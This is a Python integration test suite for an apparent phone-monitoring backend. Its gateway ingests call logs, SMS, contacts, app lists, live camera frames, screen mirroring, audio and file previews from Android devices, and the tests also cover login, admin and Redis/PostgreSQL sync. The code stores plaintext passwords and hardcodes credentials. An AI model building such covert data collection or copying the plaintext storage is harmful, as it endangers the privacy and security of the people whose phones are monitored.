import os
import sys
import time
import json
import requests
import unittest
from datetime import datetime

# Import application modules
sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))
from config import ADMIN_EMAIL, ADMIN_DEFAULT_PASSWORD, DEVICE_PORT
from core.database import (
    database, users_database, connected_devices, sid_to_device,
    save_db, save_users_db, set_device_online, set_device_offline,
    is_device_online, get_device_sid, cache_telemetry, get_cached_telemetry,
    SessionLocal, redis_client
)
from core.models import User, License, Device, Report, SystemPolicy
from core.auth import hash_password, check_password, has_device_access
from core.gateway_auth import generate_famx_token, verify_famx_token
from sockets.events import calculate_distance

class ComprehensiveBackendTest(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.web_url = "http://127.0.0.1:8801"
        cls.gateway_url = f"http://127.0.0.1:{DEVICE_PORT}"
        cls.test_username = f"test_user_{int(time.time())}"
        cls.test_password = "SecurePassword123!"
        cls.test_license = f"CYBER-TEST-{int(time.time()) % 10000:04d}-ABCD-1234"
        cls.test_device = f"TEST_DEV_{int(time.time()) % 10000:04d}"

    # -------------------------------------------------------------
    # SECTION 1: PostgreSQL Relational Integrity & Zombie Deletion
    # -------------------------------------------------------------
    def test_01_postgres_connection_and_schema(self):
        """Verifies direct connection to PostgreSQL and verifies all tables exist."""
        self.assertIsNotNone(SessionLocal, "PostgreSQL SessionLocal should be initialized")
        session = SessionLocal()
        try:
            users_count = session.query(User).count()
            licenses_count = session.query(License).count()
            devices_count = session.query(Device).count()
            reports_count = session.query(Report).count()
            policies_count = session.query(SystemPolicy).count()

            self.assertGreaterEqual(users_count, 1, "PostgreSQL should have at least 1 user")
            self.assertGreaterEqual(licenses_count, 1, "PostgreSQL should have at least 1 license")
            print(f"  [PostgreSQL] Schema Verified. Users: {users_count}, Licenses: {licenses_count}, Devices: {devices_count}")
        finally:
            session.close()

    def test_02_postgres_crud_and_zombie_prevention(self):
        """Tests adding user and license, syncing to PostgreSQL, then deleting and verifying NO zombie revival."""
        # 1. Create in UsersDatabaseProxy
        users_database["users"][self.test_username] = {
            "password_hash": hash_password(self.test_password),
            "plain_password": self.test_password,
            "role": "user",
            "devices": [self.test_device],
            "hidden_devices": []
        }
        users_database["licenses"][self.test_license] = {
            "assigned_to": self.test_username,
            "expires_at": int(time.time()) + 86400 * 30,
            "is_active": True,
            "created_at": int(time.time())
        }
        save_users_db()

        # 2. Check existence in PostgreSQL
        session = SessionLocal()
        try:
            u_row = session.query(User).filter_by(username=self.test_username).first()
            self.assertIsNotNone(u_row, "User should be synced to PostgreSQL")
            self.assertEqual(u_row.role, "user")

            l_row = session.query(License).filter_by(license_key=self.test_license).first()
            self.assertIsNotNone(l_row, "License should be synced to PostgreSQL")
            self.assertEqual(l_row.assigned_to, self.test_username)

            print("  [PostgreSQL] Record successfully created and synced to relational table.")
        finally:
            session.close()

        # 3. Delete from proxy and save (simulating admin deletion)
        users_database["licenses"].pop(self.test_license, None)
        users_database["users"].pop(self.test_username, None)
        save_users_db()

        # 4. Verify that row was DELETED from PostgreSQL (Zero-Zombie check)
        session = SessionLocal()
        try:
            u_row_del = session.query(User).filter_by(username=self.test_username).first()
            self.assertIsNone(u_row_del, "CRITICAL: Deleted user must be removed from PostgreSQL (No Zombie Resurrection!)")

            l_row_del = session.query(License).filter_by(license_key=self.test_license).first()
            self.assertIsNone(l_row_del, "CRITICAL: Deleted license must be removed from PostgreSQL (No Zombie Resurrection!)")
            print("  [PostgreSQL] Zombie prevention confirmed: Rows physically pruned from PostgreSQL.")
        finally:
            session.close()

    # -------------------------------------------------------------
    # SECTION 2: Redis Presence & Fast Cache Layer
    # -------------------------------------------------------------
    def test_03_redis_presence_tracking(self):
        """Verifies Redis cluster-wide presence tracking, online sets, and socket ID mapping."""
        self.assertIsNotNone(redis_client, "Redis client must be initialized")
        test_sid = f"sid_{int(time.time())}"

        # 1. Device connects
        set_device_online(self.test_device, test_sid, self.test_license)

        # 2. Verify in memory and in Redis
        self.assertTrue(is_device_online(self.test_device), "Device should report online")
        self.assertEqual(get_device_sid(self.test_device), test_sid, "Socket ID must match")
        self.assertTrue(redis_client.sismember("devices:online", self.test_device), "Redis set must contain device")
        self.assertEqual(redis_client.get(f"device:{self.test_device}:sid"), test_sid)
        self.assertEqual(redis_client.get(f"sid:{test_sid}:device"), self.test_device)
        print("  [Redis] Presence registered: 'devices:online' set and reverse SID mapping verified.")

        # 3. Device disconnects
        disconnected_id = set_device_offline(test_sid)
        self.assertEqual(disconnected_id, self.test_device)
        self.assertFalse(is_device_online(self.test_device), "Device should report offline after disconnect")
        self.assertFalse(redis_client.sismember("devices:online", self.test_device), "Device must be removed from Redis set")
        self.assertIsNone(redis_client.get(f"device:{self.test_device}:sid"))
        print("  [Redis] Presence cleared: Device successfully removed from Redis cluster tracking.")

    def test_04_redis_telemetry_caching(self):
        """Tests caching telemetry objects with TTL and automatic deserialization."""
        cache_telemetry(f"test:cache:{self.test_device}", {"lat": 28.6139, "lng": 77.2090, "status": "ok"}, ex=60)
        cached_val = get_cached_telemetry(f"test:cache:{self.test_device}")
        self.assertIsInstance(cached_val, dict)
        self.assertEqual(cached_val["lat"], 28.6139)
        self.assertEqual(cached_val["status"], "ok")

        # Test VPN IP and Port cached in Redis
        vpn_ip = redis_client.get("system:vpn:ip")
        vpn_port = redis_client.get("system:vpn:port")
        self.assertIsNotNone(vpn_ip, "VPN IP should be cached in Redis")
        self.assertIsNotNone(vpn_port, "VPN Port should be cached in Redis")
        print(f"  [Redis] Telemetry Cache Verified. Current VPN IP: {vpn_ip}, Port: {vpn_port}")

    # -------------------------------------------------------------
    # SECTION 3: famX Hardware Ingestion Gateway (Port 5001)
    # -------------------------------------------------------------
    def test_05_gateway_health_and_token(self):
        """Tests Gateway health check and cryptographic hardware token issuance/verification."""
        # 1. Health check
        resp = requests.get(f"{self.gateway_url}/checkme", timeout=5)
        self.assertEqual(resp.status_code, 200)
        data = resp.json()
        self.assertTrue(data.get("connected"))
        self.assertEqual(data.get("service"), "famX Ingestion Gateway")

        # 2. Token issuance
        token = generate_famx_token(self.test_device)
        self.assertTrue(token.startswith(f"famX_{self.test_device}_"))
        self.assertTrue(verify_famx_token(self.test_device, token))
        self.assertFalse(verify_famx_token(self.test_device, "invalid_token_123"))

        # 3. HTTP Token endpoint
        resp_token = requests.get(f"{self.gateway_url}/api/device/{self.test_device}/token", timeout=5)
        self.assertEqual(resp_token.status_code, 200)
        self.assertEqual(resp_token.json().get("famX_token"), token)
        print("  [Gateway] Health check 200 OK & Hardware Token Cryptographic Signature Verified.")

    def test_06_gateway_telemetry_file_ingestion(self):
        """Tests high-throughput hardware telemetry ingestion across all supported categories."""
        token = generate_famx_token(self.test_device)
        headers = {"X-famX-Token": token}

        categories_to_test = [
            ("calls", "test_calls.txt", "1,9876543210,John Doe,Incoming,120,1690000000\n"),
            ("sms", "test_sms.txt", "1,9876543210,Hello test message,inbox,1690000000\n"),
            ("contacts", "test_contacts.txt", "John Doe: +19876543210\nJane Smith: +15551234567\n"),
            ("apps", "test_apps.txt", "WhatsApp: com.whatsapp\nTelegram: org.telegram.messenger\n"),
            ("info", "test_info.txt", "model: TestModel Pro\nmanufacturer: TestBrand\nandroid: 14\nbattery: 95%\n")
        ]

        for cat, fname, content in categories_to_test:
            files = {"file": (fname, content.encode('utf-8'), 'text/plain')}
            data = {"category": cat}
            resp = requests.post(
                f"{self.gateway_url}/api/device/{self.test_device}/upload_media",
                headers=headers,
                files=files,
                data=data,
                timeout=5
            )
            self.assertEqual(resp.status_code, 200, f"Upload failed for {cat}: {resp.text}")
            self.assertTrue(resp.json().get("success"))

            disk_file = os.path.join("data", self.test_device, f"{cat}.txt")
            self.assertTrue(os.path.exists(disk_file), f"File {disk_file} should be saved to disk")

        # Verify info record updated in database proxy and in PostgreSQL
        dev_info = database.get(self.test_device, {}).get("info", {})
        self.assertEqual(dev_info.get("model"), "TestModel Pro")
        self.assertEqual(dev_info.get("manufacturer"), "TestBrand")
        print("  [Gateway] Ingested & parsed calls, sms, contacts, apps, and hardware info.")

    def test_07_gateway_media_and_previews(self):
        """Tests ingestion of live camera frames, screen mirror frames, audio recordings, and file previews."""
        token = generate_famx_token(self.test_device)
        headers = {"X-famX-Token": token}
        dummy_jpeg = b"\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x01\x00H\x00H\x00\x00\xff\xdb\x00C\x00\xff\xd9"
        dummy_audio = b"ID3\x03\x00\x00\x00\x00\x00#TSSE\x00\x00\x00\x0f\x00\x00\x03Lavf58.29.100\x00"

        # 1. Live Camera Frame
        resp_cam = requests.post(
            f"{self.gateway_url}/api/device/{self.test_device}/upload_media",
            headers=headers,
            files={"file": ("live_camera.jpg", dummy_jpeg, "image/jpeg")},
            data={"category": "live_camera"},
            timeout=5
        )
        self.assertEqual(resp_cam.status_code, 200)
        self.assertIn("live_camera.jpg", database[self.test_device]["live_camera_url"])
        self.assertEqual(get_cached_telemetry(f"device:{self.test_device}:live_camera_url"), database[self.test_device]["live_camera_url"])

        # 2. Screen Mirror Frame
        resp_mirror = requests.post(
            f"{self.gateway_url}/api/device/{self.test_device}/upload_media",
            headers=headers,
            files={"file": ("mirror.jpg", dummy_jpeg, "image/jpeg")},
            data={"category": "mirror"},
            timeout=5
        )
        self.assertEqual(resp_mirror.status_code, 200)
        self.assertIn("mirror.jpg", database[self.test_device]["mirror_url"])
        self.assertEqual(get_cached_telemetry(f"device:{self.test_device}:mirror_url"), database[self.test_device]["mirror_url"])

        # 3. Live Audio Chunk
        audio_name = f"audio_{int(time.time())}_30s.mp3"
        resp_audio = requests.post(
            f"{self.gateway_url}/api/device/{self.test_device}/upload_media",
            headers=headers,
            files={"file": (audio_name, dummy_audio, "audio/mpeg")},
            data={"category": "audio"},
            timeout=5
        )
        self.assertEqual(resp_audio.status_code, 200)
        self.assertIn(audio_name, database[self.test_device]["live_audio_url"])

        # 4. File Manager Preview Upload (Verifying the Preview Fix!)
        preview_name = f"preview_{int(time.time())}.jpg"
        resp_prev = requests.post(
            f"{self.gateway_url}/api/device/{self.test_device}/upload_media",
            headers=headers,
            files={"file": (preview_name, dummy_jpeg, "image/jpeg")},
            data={"category": "previews", "path": "/sdcard/DCIM/Camera/IMG_001.jpg"},
            timeout=5
        )
        self.assertEqual(resp_prev.status_code, 200)
        previews_dict = database[self.test_device].get("previews", {})
        self.assertGreaterEqual(len(previews_dict), 1, "Previews dictionary must contain the uploaded preview")
        found = any(p.get("name") == preview_name for p in previews_dict.values())
        self.assertTrue(found, "Uploaded preview must be indexed in device previews")
        print("  [Gateway] Ingested live camera, screen mirror, audio chunk, and file preview successfully.")

    # -------------------------------------------------------------
    # SECTION 4: Real-time Sockets & Mathematical Logic
    # -------------------------------------------------------------
    def test_08_mathematical_geofence_and_distance(self):
        """Verifies Haversine geodetic distance formula and geofencing calculations."""
        # Distance between Eiffel Tower (48.8584, 2.2945) and Louvre Museum (48.8606, 2.3376) ~ 3.16 km
        lat1, lng1 = 48.8584, 2.2945
        lat2, lng2 = 48.8606, 2.3376
        dist = calculate_distance(lat1, lng1, lat2, lng2)
        self.assertAlmostEqual(dist, 3180, delta=150, msg="Haversine distance calculation error exceeds margin")
        print(f"  [Math/Logic] Haversine calculation verified: {dist:.1f} meters.")

    # -------------------------------------------------------------
    # SECTION 5: Web Dashboard & API Endpoints (Port 8801)
    # -------------------------------------------------------------
    def test_09_auth_login_and_rbac(self):
        """Tests user login, license verification, session creation, and device access control."""
        s = requests.Session()

        # 1. Invalid credentials rejection
        resp_bad = s.post(f"{self.web_url}/login", json={
            "username": "non_existent_user",
            "password": "wrong_password",
            "license_key": "INVALID-KEY"
        }, timeout=5)
        self.assertEqual(resp_bad.status_code, 401)

        # 2. Valid user login with seed test credentials
        resp_login = s.post(f"{self.web_url}/login", json={
            "username": "test",
            "password": "test",
            "license_key": "CYBER-3ZPY-J99Y-86I1-TNPF"
        }, timeout=5)
        self.assertEqual(resp_login.status_code, 200, f"Login failed: {resp_login.text}")
        self.assertTrue(resp_login.json().get("success"))

        # 3. Check /check_auth
        resp_chk = s.get(f"{self.web_url}/check_auth", timeout=5)
        self.assertTrue(resp_chk.json().get("authorized"))

        # 4. Check /api/devices (only authorized devices returned)
        resp_devs = s.get(f"{self.web_url}/api/devices", timeout=5)
        self.assertEqual(resp_devs.status_code, 200)
        devs = resp_devs.json()
        self.assertIsInstance(devs, list)
        dev_ids = [d["id"] for d in devs]
        self.assertIn("V2238_C323", dev_ids)

        # 5. Check user details API
        resp_usr = s.get(f"{self.web_url}/api/user/details", timeout=5)
        self.assertEqual(resp_usr.status_code, 200)
        usr_data = resp_usr.json()
        self.assertEqual(usr_data.get("username"), "test")
        self.assertEqual(usr_data.get("license_key"), "CYBER-3ZPY-J99Y-86I1-TNPF")

        print(f"  [Web/Auth] Login 200 OK, Session Authenticated, Devices: {dev_ids}")

    def test_10_api_previews_and_streaming(self):
        """Tests the file manager preview listing and binary media streaming endpoint."""
        s = requests.Session()
        s.post(f"{self.web_url}/login", json={
            "username": "test",
            "password": "test",
            "license_key": "CYBER-3ZPY-J99Y-86I1-TNPF"
        }, timeout=5)

        # 1. Fetch previews
        resp_prev = s.get(f"{self.web_url}/api/device/V2238_C323/previews", timeout=5)
        self.assertEqual(resp_prev.status_code, 200)
        previews = resp_prev.json()
        self.assertIsInstance(previews, dict)

        # 2. Test media streaming endpoint
        # Create a test media file to stream
        os.makedirs("media/V2238_C323", exist_ok=True)
        test_stream_file = os.path.join("media", "V2238_C323", "test_stream.jpg")
        with open(test_stream_file, "wb") as f:
            f.write(b"\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x01\x00H\x00H\x00\x00\xff\xd9")

        resp_stream = s.get(f"{self.web_url}/api/media/stream/V2238_C323/test_stream.jpg", timeout=5)
        self.assertEqual(resp_stream.status_code, 200)
        self.assertIn("image/jpeg", resp_stream.headers.get("Content-Type", ""))
        print("  [Web/API] Previews query and direct binary media streaming 200 OK.")

    def test_11_user_report_issue_and_admin_resolution(self):
        """Tests user submitting an issue report, saving to DB & PostgreSQL, and admin resolving it."""
        s_user = requests.Session()
        s_user.post(f"{self.web_url}/login", json={
            "username": "test",
            "password": "test",
            "license_key": "CYBER-3ZPY-J99Y-86I1-TNPF"
        }, timeout=5)

        # Submit report
        rep_resp = s_user.post(f"{self.web_url}/api/user/report_issue", json={
            "issue_text": "Automated integration test issue: device signal weak."
        }, timeout=5)
        self.assertEqual(rep_resp.status_code, 200)
        report_id = rep_resp.json().get("report_id")
        self.assertIsNotNone(report_id)

        # Admin login
        s_admin = requests.Session()
        admin_login_resp = s_admin.post(f"{self.web_url}/admin/login", json={
            "username": ADMIN_EMAIL,
            "password": ADMIN_DEFAULT_PASSWORD
        }, timeout=5)
        self.assertEqual(admin_login_resp.status_code, 200)

        # Admin list reports
        list_resp = s_admin.get(f"{self.web_url}/api/admin/list_reports", timeout=5)
        self.assertEqual(list_resp.status_code, 200)
        reports = list_resp.json().get("reports", [])
        found_report = next((r for r in reports if r.get("id") == report_id), None)
        self.assertIsNotNone(found_report)
        self.assertEqual(found_report.get("status"), "pending")

        # Admin resolve report
        res_resp = s_admin.post(f"{self.web_url}/api/admin/resolve_report", json={
            "report_id": report_id,
            "action": "resolve"
        }, timeout=5)
        self.assertEqual(res_resp.status_code, 200)

        # Clean up test report
        s_admin.post(f"{self.web_url}/api/admin/resolve_report", json={
            "report_id": report_id,
            "action": "delete"
        }, timeout=5)
        print("  [Web/Admin] Report issue submitted, listed, resolved, and purged.")

    def test_12_admin_maintenance_mode_policy(self):
        """Tests system maintenance mode toggle, non-admin 503 rejection, and resumption."""
        s_admin = requests.Session()
        s_admin.post(f"{self.web_url}/admin/login", json={
            "username": ADMIN_EMAIL,
            "password": ADMIN_DEFAULT_PASSWORD
        }, timeout=5)

        s_user = requests.Session()
        s_user.post(f"{self.web_url}/login", json={
            "username": "test",
            "password": "test",
            "license_key": "CYBER-3ZPY-J99Y-86I1-TNPF"
        }, timeout=5)

        # 1. Enable maintenance mode
        maint_on = s_admin.post(f"{self.web_url}/api/admin/apply_maintenance", json={
            "enabled": True,
            "message": "System Upgrade in Progress"
        }, timeout=5)
        self.assertEqual(maint_on.status_code, 200)

        # 2. User request should receive 503 Maintenance
        resp_user_maint = s_user.get(f"{self.web_url}/api/devices", timeout=5)
        self.assertEqual(resp_user_maint.status_code, 503, "Non-admin requests should receive 503 during maintenance")

        # 3. Disable maintenance mode
        maint_off = s_admin.post(f"{self.web_url}/api/admin/apply_maintenance", json={
            "enabled": False
        }, timeout=5)
        self.assertEqual(maint_off.status_code, 200)

        # 4. User request succeeds again
        resp_user_ok = s_user.get(f"{self.web_url}/api/devices", timeout=5)
        self.assertEqual(resp_user_ok.status_code, 200)
        print("  [Web/Admin] Maintenance mode policy toggle & 503 enforcement verified.")

    # -------------------------------------------------------------
    # SECTION 6: Cleanup
    # -------------------------------------------------------------
    @classmethod
    def tearDownClass(cls):
        # Clean up any test device data on disk
        import shutil
        data_dir = os.path.join("data", cls.test_device)
        media_dir = os.path.join("media", cls.test_device)
        if os.path.exists(data_dir):
            shutil.rmtree(data_dir, ignore_errors=True)
        if os.path.exists(media_dir):
            shutil.rmtree(media_dir, ignore_errors=True)
        database.pop(cls.test_device, None)
        save_db()

if __name__ == '__main__':
    unittest.main(verbosity=2)
